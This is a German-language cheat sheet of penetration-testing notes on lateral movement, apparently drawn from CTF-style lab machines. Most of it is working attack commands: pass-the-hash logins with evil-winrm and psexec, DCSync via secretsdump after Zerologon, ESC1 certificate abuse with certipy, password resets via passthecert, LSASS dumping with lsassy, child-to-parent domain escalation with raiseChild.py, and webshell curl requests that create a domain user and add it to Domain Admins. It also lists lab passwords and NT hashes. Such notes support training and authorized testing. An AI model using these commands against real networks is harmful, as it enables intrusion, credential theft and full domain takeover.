# Lateral-Movement


## Ziel der Lateral-Movement Phase

- Bewegung zwischen Systemen innerhalb des Netzwerks
- Zugriff auf weitere Benutzer-Accounts und Systeme
- Ausnutzung von Credentials für horizontale Eskalation
- Vorbereitung für Domain-weite Kompromittierung

---

## Relevante Techniken & Vorgehensweisen

### SSH (Linux/Windows)

**Mit Private Key:**


```bash
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@<TARGET_IP>
# Password: I_love_java
```

**Mit Passwort:**


```bash
ssh peter.turner@hybrid.vl@<TARGET_IP>
# Pass: b0cwR+G4Dzl_rw
```

### RDP (Remote Desktop Protocol)

**xfreerdp3:**


```bash
# Kiosk Mode (ohne Credentials)
xfreerdp3 /v:<TARGET_IP> /u:"" /cert:ignore /tls:seclevel:0 /sec:tls +clipboard +dynamic-resolution

# Mit Credentials
xfreerdp3 /v:<TARGET_IP> /u:Gale.Dekarios /p:'ty8wnW9qCKDosXo6'
```

**Hinweis:**

- Kann 1-2 Minuten dauern
- Neue xfreerdp3-Version hat andere Syntax

### Evil-WinRM (Windows Remote Management)

**Mit Passwort:**


```bash
evil-winrm -i <TARGET_IP> -u 'Caroline.Robinson' -p 'NewPassword123!@'
evil-winrm -i retro.vl -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
```

**Mit NT-Hash (Pass-the-Hash):**


```bash
evil-winrm -i retro.vl -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
evil-winrm -i <TARGET_IP> -u Administrator -H <NT_HASH>
evil-winrm -i <PARENT_DC_IP> -u Administrator -H <ADMIN_HASH>
```

**Features:**

- PowerShell Remoting
- Download/Upload-Funktionen
- Ideal für Domain-Operations

### PSExec (Pass-the-Hash)

**Impacket PSExec:**


```bash
psexec.py -hashes :c06552bdb50ada21a7c74536c231b848 Administrator@<TARGET_IP>
psexec.py -hashes :<NT_HASH> Administrator@<TARGET_IP>
```

**Resultat:**

- NT AUTHORITY\SYSTEM Shell

### SMBClient (Linux to Windows)

**Mit Credentials:**


```bash
smbclient //<TARGET_IP>/Notes -U trainee%trainee
smbclient //10.10.88.221/Notes -U trainee%trainee
smbclient \\\\<TARGET_IP>\\BillySMB
```

**Anonymous:**


```bash
smbclient -L \\<TARGET_IP>\\
```

**Impacket SMBClient:**


```bash
smbclient.py guest@retro2.vl -no-pass
```

### Configuration File Pivoting

**Joomla configuration.php:**


```bash
cd /var/www/html
cat configuration.php
```

**Typischer Fund:**


```php
public $password = 'nv5uz9r3ZEDzVjNu';
```

**Pivoting:**


```bash
ssh jjameson@<TARGET_IP>
# Password: nv5uz9r3ZEDzVjNu
```

**Konzept:**

- Oft gleiche Passwörter für DB und User-Accounts

### mRemoteNG to RDP

**Config-Datei extrahiert:**


```xml
Username: Gale.Dekarios
Password (decrypted): ty8wnW9qCKDosXo6
```

**RDP-Login:**


```bash
xfreerdp3 /v:<TARGET_IP> /u:Gale.Dekarios /p:'ty8wnW9qCKDosXo6'
```

### NFS to SSH

**NFS Share gemountet:**


```bash
sudo mount -t nfs -o vers=3,nolock <TARGET_IP>:/opt/share /tmp/mount
cd /tmp/mount
ls
```

**Backup extrahiert:**


````bash
tar -xvf backup.tar.gz
```

**Credentials gefunden:**
```
peter.turner@hybrid.vl:PeterIstToll!
````

**SSH-Login:**


````bash
ssh peter.turner@hybrid.vl@<TARGET_IP>
# Pass: PeterIstToll! (aus KeePass: b0cwR+G4Dzl_rw)
```

### Password Reuse

**Szenario:**
1. User-Passwort aus Config-Datei
2. Testen gegen andere Services:
   - SSH
   - RDP
   - WinRM
   - SMB

**Beispiel (Daily Bugle):**
```
Config: nv5uz9r3ZEDzVjNu
SSH User: jjameson
Result: Successful login
````

### Domain User Creation to Admin

**Initial Shell (apache/www-data):**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=whoami"
```

**Domain User erstellen:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"
```

**Zu lokalen Admins hinzufügen:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

**Evil-WinRM Access:**


```bash
evil-winrm -u harry -p 'haxxor@12345' -i <TARGET_IP>
```

**Zu Domain Admins:**

cmd

```cmd
net group "Domain Admins" harry /add /domain
```

### Certificate-based Lateral Movement

**Certificate Authentication:**


````bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
# UPN-Identity wählen: 0 (administrator@retro.vl)
```

**Hash extrahiert:**
```
Administrator:252fac7066d93dd009d4fd2cd0368389
````

**WinRM Login:**


```bash
evil-winrm -i retro.vl -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
```

### Child-to-Parent Domain Movement

**Child Domain Admin erreicht:**

cmd

```cmd
net group "Domain Admins" harry /add /domain
```

**Credentials extrahiert:**


```bash
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
```

**raiseChild.py:**


```bash
raiseChild.py lab.trusted.vl/cpowers -hashes :<NT_HASH>
```

**Parent Domain Compromise:**


```bash
secretsdump.py -hashes :<ADMIN_HASH> trusted.vl/Administrator@<PARENT_DC_IP>
```

**Parent DC Login:**


```bash
evil-winrm -i <PARENT_DC_IP> -u Administrator -H <ADMIN_HASH>
```

**Konzept:**

- Child Domain Admin → Trust Relationship → Parent Domain Admin

### Pass-the-Hash (nach Hash-Extraction)

**NTDS.dit extrahiert:**


````bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Hash-Output:**
```
Administrator:ee4457ae59f1e3fbd764e33d9cef123d
````

**Evil-WinRM:**


```bash
evil-winrm -i <TARGET_IP> -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

### DCSync to Pass-the-Hash

**Nach Zerologon:**


````bash
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

**Administrator Hash:**
```
Administrator:c06552bdb50ada21a7c74536c231b848
````

**PSExec:**


```bash
psexec.py -hashes :c06552bdb50ada21a7c74536c231b848 Administrator@<TARGET_IP>
```

### Pass-the-Cert to Password Reset

**Certificate erstellt (ESC1):**


```bash
certipy-ad req -u 'MAIL01$' -hashes :<NTLM_HASH> -ca hybrid-DC01-CA -target <TARGET_IP> -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

**Password Reset:**


```bash
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip <TARGET_IP> -target administrator -new-pass Password123!
```

**Domain Admin Login:**


```bash
evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
```

---

## Betriebssystem-spezifische Aspekte (Windows)

### Windows Remote Access Protocols

**WinRM (Port 5985/5986):**

- PowerShell Remoting
- Evil-WinRM
- Requires credentials or hash

**RDP (Port 3389):**

- GUI-Zugriff
- xfreerdp3
- Kiosk Mode möglich

**SMB (Port 445):**

- File Sharing
- PSExec
- Pass-the-Hash

### Windows Authentication

**NT-Hash (NTLM):**

- Pass-the-Hash möglich
- Keine Plaintext-Passwörter nötig
- Evil-WinRM, PSExec

**Kerberos:**

- Certificate-based Authentication
- TGT/TGS Tickets
- ADCS Integration

### Domain Concepts

**Domain Users:**

- Können netzwerkweit gültig sein
- Credential Reuse kritisch

**Computer Accounts:**

- Enden mit $ (z.B. BANKING,MAIL01, MAIL01 ,MAIL01)
- Können für Lateral Movement missbraucht werden

**Trust Relationships:**

- Child-to-Parent Domain
- Trust-Key-Extraktion
- SID-History Injection

---

## Typische Angriffsflächen

### Credential Reuse

**Database-Passwörter:**

- configuration.php, wp-config.php
- Oft identisch mit User-Passwörtern
- SSH, RDP, WinRM testen

**mRemoteNG:**

- config.xml mit verschlüsselten RDP-Credentials
- Decrypt → RDP-Zugriff

**KeePass:**

- Passwort-Datenbanken
- Domain-Credentials enthalten

### Pass-the-Hash

**Nach Hash-Extraction:**

- NTDS.dit (Volume Shadow Copy)
- DCSync (nach Zerologon)
- lsassy (LSASS Dump)

**Verwendung:**

- Evil-WinRM (-H Flag)
- PSExec (-hashes Flag)

### Certificate-based Access

**ADCS ESC1:**

- Certificate für Admin-User anfordern
- Authentication → NT-Hash
- Pass-the-Hash

**Pass-the-Cert:**

- Certificate für Password Reset
- Neues Passwort setzen
- Login mit neuem Passwort

### Domain Escalation

**Domain User Creation:**

- Via Webshell/RCE
- net user /add /domain
- Zu Admins hinzufügen

**Child-to-Parent:**

- Child Domain Admin erreichen
- Trust Relationship ausnutzen
- raiseChild.py
- Parent Domain Admin

### Configuration Files

**Web Applications:**

- Joomla: configuration.php
- WordPress: wp-config.php
- Custom: db.php, config.yml

**Remote Desktop:**

- mRemoteNG: config.xml
- Remote Desktop Plus: profiles.xml

---

## Wichtige Befehle & Syntax

### SSH


```bash
ssh -i <KEY_FILE> <USER>@<TARGET_IP>
ssh <USER>@<TARGET_IP>
chmod 600 <KEY_FILE>
```

### RDP


```bash
xfreerdp3 /v:<TARGET_IP> /u:<USER> /p:'<PASS>'
xfreerdp3 /v:<TARGET_IP> /u:"" /cert:ignore /tls:seclevel:0 /sec:tls +clipboard +dynamic-resolution
```

### Evil-WinRM


```bash
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'
evil-winrm -i <TARGET_IP> -u <USER> -H <NT_HASH>
```

### PSExec


```bash
psexec.py -hashes :<NT_HASH> <USER>@<TARGET_IP>
```

### SMBClient


```bash
smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>
smbclient.py <USER>@<TARGET_IP> -no-pass
```

### Certificate Authentication


```bash
certipy-ad auth -pfx <PFX_FILE> -dc-ip <TARGET_IP>
```

### Pass-the-Cert


```bash
python3 passthecert.py -action modify_user -crt <CRT> -key <KEY> -domain <DOMAIN> -dc-ip <TARGET_IP> -target <USER> -new-pass <PASS>
```

### Domain User Creation


````bash
# Via Webshell
curl "http://<TARGET_IP>/back.php?c=net%20user%20<USER>%20<PASS>%20/add%20/domain"
curl "http://<TARGET_IP>/back.php?c=net%20localgroup%20Administrators%20<USER>%20/add%20/domain"

# In Shell
net user <USER> <PASS> /add /domain
net localgroup Administrators <USER> /add /domain
net group "Domain Admins" <USER> /add /domain
```

---

## Reihenfolge & Abhängigkeiten

### Configuration File to User Flow

1. **Initial Access** → www-data/apache Shell
2. **Config-Datei lesen** → configuration.php
3. **Credentials extrahieren** → DB-Passwort
4. **SSH testen** → Mit gleichem Passwort
5. **User Flag** → /home/user/user.txt

**Beispiel (Daily Bugle):**
```
Initial: Meterpreter (www-data)
Config: /var/www/html/configuration.php
Password: nv5uz9r3ZEDzVjNu
SSH: jjameson@<TARGET_IP>
Result: User Shell
```

### mRemoteNG to RDP Flow

1. **Shell als User** → ellen.freeman
2. **Documents durchsuchen** → config.xml
3. **Decrypt** → mremoteng_decrypt.py
4. **RDP-Credentials** → Gale.Dekarios:ty8wnW9qCKDosXo6
5. **RDP-Login** → xfreerdp3
6. **User Flag** → Desktop

**Beispiel (Lock VM):**
```
Initial: Shell (ellen.freeman via CI/CD)
Config: C:\Users\ellen.freeman\Documents\config.xml
Decrypted: ty8wnW9qCKDosXo6
RDP User: Gale.Dekarios
Result: GUI Access + User Flag
```

### NFS to SSH Flow

1. **NFS Enumeration** → showmount -e
2. **Mount** → sudo mount
3. **Backup finden** → backup.tar.gz
4. **Extrahieren** → tar -xvf
5. **Credentials** → peter.turner:PeterIstToll!
6. **KeePass** → Domain-Passwort
7. **SSH-Login** → b0cwR+G4Dzl_rw

**Beispiel (Hybrid VM):**
```
NFS: /opt/share
Backup: backup.tar.gz
KeePass Master: PeterIstToll!
Domain Pass: b0cwR+G4Dzl_rw
SSH: peter.turner@hybrid.vl@<TARGET_IP>
Result: User Shell
```

### Hash to Pass-the-Hash Flow

1. **Hash-Extraction** → NTDS.dit, DCSync, lsassy
2. **Administrator Hash** → NT-Hash
3. **Evil-WinRM** → -H Flag
4. **SYSTEM/Admin Shell** → whoami

**Beispiel (Baby VM):**
```
Method: Volume Shadow Copy (SeBackupPrivilege)
NTDS.dit: Extrahiert
Hash: Administrator:ee4457ae59f1e3fbd764e33d9cef123d
Evil-WinRM: Pass-the-Hash
Result: Domain Admin
```

### Webshell to Domain Admin Flow

1. **Webshell** → back.php?c=
2. **Domain User erstellen** → net user /add /domain
3. **Zu Admins** → net localgroup Administrators /add
4. **Evil-WinRM** → Mit neuen Credentials
5. **Domain Admins** → net group "Domain Admins" /add

**Beispiel (Trusted VM):**
```
Webshell: back.php
User: harry:haxxor@12345
Local Admin: net localgroup Administrators harry /add /domain
Evil-WinRM: Erfolgreicher Login
Domain Admin: net group "Domain Admins" harry /add /domain
Result: Full Domain Control
```

### Certificate to Pass-the-Hash Flow

1. **Certificate Request** → certipy req (ESC1)
2. **Authentication** → certipy auth
3. **NT-Hash** → Administrator Hash
4. **Pass-the-Hash** → Evil-WinRM -H

**Beispiel (Retro VM):**
```
User: banking$ (Computer Account)
Template: RetroClients (ESC1)
Certificate UPN: administrator@retro.vl
Hash: 252fac7066d93dd009d4fd2cd0368389
Result: Domain Admin
```

### Child-to-Parent Domain Flow

1. **Child Domain Admin** → net group "Domain Admins"
2. **Credentials extrahieren** → lsassy
3. **raiseChild.py** → Automatische Escalation
4. **Parent Hash** → secretsdump
5. **Pass-the-Hash** → Parent DC

**Beispiel (Trusted VM):**
```
Child: lab.trusted.vl
Child Admin: harry
cpowers Hash: 322db798a55f85f09b3d61b976a13c43
raiseChild.py: Erfolg
Parent: trusted.vl
Parent Admin Hash: 15db914be1e6a896e7692f608a9d72ef
Result: Enterprise Admin
```

---

## Typische Findings & Fehler

### Erfolgreiche Lateral Movements

**Daily Bugle (Config to SSH):**
```
Initial: www-data (WordPress Shell)
Config: /var/www/html/configuration.php
Password: nv5uz9r3ZEDzVjNu
SSH User: jjameson
Result: User Flag
```

**Lock (mRemoteNG to RDP):**
```
Initial: ellen.freeman (CI/CD Shell)
Config: C:\Users\ellen.freeman\Documents\config.xml
Decrypted: ty8wnW9qCKDosXo6
RDP: Gale.Dekarios
Result: User Flag (1-2 Min Wartezeit)
```

**Hybrid (NFS to SSH):**
```
NFS: /opt/share (backup.tar.gz)
Credentials: peter.turner:PeterIstToll!
KeePass Domain Pass: b0cwR+G4Dzl_rw
SSH: peter.turner@hybrid.vl@<TARGET_IP>
Result: User Shell
```

**Trusted (Webshell to Domain Admin):**
```
Initial: MySQL → Webshell (back.php)
User Created: harry:haxxor@12345
Local Admin: net localgroup Administrators harry /add /domain
Evil-WinRM: Erfolg
Domain Admin: net group "Domain Admins" harry /add /domain
Result: Full Domain Control
```

**Baby (Hash to Pass-the-Hash):**
```
Method: Volume Shadow Copy (SeBackupPrivilege)
NTDS.dit: Extrahiert via robocopy /B
Hash: Administrator:ee4457ae59f1e3fbd764e33d9cef123d
Evil-WinRM: Pass-the-Hash
Result: Domain Admin
```

**Retro (Certificate to Domain Admin):**
```
Computer Account: BANKING$ (Password geändert)
Template: RetroClients (ESC1)
Certificate: administrator@retro.vl
Hash: 252fac7066d93dd009d4fd2cd0368389
Evil-WinRM: Pass-the-Hash
Result: Domain Admin
```

**Retro2 (DCSync to Pass-the-Hash):**
```
Zerologon: DC Machine Account Password = leer
DCSync: secretsdump -no-pass
Hash: Administrator:c06552bdb50ada21a7c74536c231b848
PSExec: Pass-the-Hash
Result: Domain Admin
```

**Trusted (Child-to-Parent):**
```
Child Domain: lab.trusted.vl
Child Admin: harry (via Webshell)
cpowers Hash: 322db798a55f85f09b3d61b976a13c43
raiseChild.py: Automatische Escalation
Parent: trusted.vl
Parent Admin Hash: 15db914be1e6a896e7692f608a9d72ef
Evil-WinRM: Parent DC
Result: Enterprise Admin
```

**Hybrid (Pass-the-Cert):**
```
Machine Account: MAIL01$
Keytab: krb5.keytab → NTLM Hash
Certificate: administrator@hybrid.vl (ESC1)
Pass-the-Cert: Password Reset
New Password: Password123!
Evil-WinRM: administrator:Password123!
Result: Domain Admin
````

### Fehlerhafte Lateral Movements

**SSH-Login fehlgeschlagen:**

- Passwort nicht identisch mit DB-Passwort
- User existiert nicht auf System
- SSH-Port gefiltert

**RDP-Login verzögert:**

- xfreerdp3 braucht 1-2 Minuten
- Keine Fehlermeldung → Geduld
- Session wird aufgebaut

**Evil-WinRM Connection Failed:**

- WinRM nicht aktiviert (Port 5985/5986)
- Credentials falsch
- Hash-Format falsch (nur NT-Hash, kein LM)

**Pass-the-Hash schlägt fehl:**

- LM-Hash mitgesendet → Nur NT-Hash verwenden
- Falsches Format → :NT_HASH (Doppelpunkt vor Hash)

**Certificate Authentication:**

- Falsche Identity gewählt → UPN-Identity (0) wählen
- PFX-Passwort falsch → Neu anfordern

**Domain User Creation:**

- /domain Flag vergessen → Lokaler User statt Domain
- Berechtigungen fehlen → Webshell läuft als SYSTEM nötig

**Child-to-Parent Escalation:**

- DNS nicht konfiguriert → /etc/hosts kritisch!
- raiseChild.py schlägt fehl → Trust-Info prüfen

**Password Reuse:**

- Funktioniert nicht immer
- DB-Passwort ≠ User-Passwort
- Mehrere Passwörter testen

### Credential Reuse Success Rate

**Hoch (>70%):**

- Joomla/WordPress configuration.php
- mRemoteNG config.xml
- KeePass-Datenbanken

**Mittel (30-70%):**

- Database-User zu SSH
- Local Admin zu Domain Admin

**Niedrig (<30%):**

- Random Password Testing
- Default Credentials

### Pass-the-Hash Requirements

**Evil-WinRM:**

- WinRM aktiviert (Port 5985/5986)
- NT-Hash im Format: -H <HASH>
- User muss Remote-Rechte haben

**PSExec:**

- SMB erreichbar (Port 445)
- Admin-Rechte nötig
- Format: -hashes :<NT_HASH>

### Certificate-based Access

**ESC1 Requirements:**

- Computer Account oder berechtigt
- Template: Enrollee Supplies Subject = True
- Client Authentication: Enabled

**Pass-the-Cert:**

- Certificate + Private Key
- PassTheCert-Tool
- Password Reset Permissions

